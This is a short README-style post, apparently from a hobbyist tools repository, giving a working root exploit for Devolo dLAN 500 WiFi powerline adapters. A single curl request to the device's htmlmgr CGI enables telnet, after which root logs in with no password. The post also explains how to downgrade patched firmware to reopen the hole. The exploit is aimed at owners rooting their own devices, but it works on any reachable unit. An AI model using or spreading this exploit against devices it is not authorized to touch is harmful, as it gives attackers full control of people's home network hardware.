This was tested on 2.0.2 and 2.0.4 on a dLAN 500 WiFI. This exploit doesn't work anymore on 3.1.3. I don't know when this was fixed.

There's a report of the same exploit also working for the [Devolo dlan 200 AV Wireless N with v.5 firmware](https://github.com/lawl/devolotools/issues/2).

Fortunately for you, if you're on 3.1.3 you can simply downgrade, as the "update firmware" thingy doesn't check. I found `firmware-dlan-500-wifi-v2-0-2.dvl` in this folder on the intertubes, flashed it and my 1337 root sploit works again. Since I found it on the interwebs however, I can of course not guarantee you that the image is clean.

Here we go:

    curl 'http://IPGOESHERE/cgi-bin/htmlmgr' -H 'Content-Type: application/x-www-form-urlencoded' --data '%3Asys%3ASystem.Baptization.Telnetd=1'

Wait 30 seconds.

Powercycle your devolo. I.e. pull it from the power outlet and replug.

Wait until it boots.

Telnet into your devolo.

Username: root

It will not ask for a password
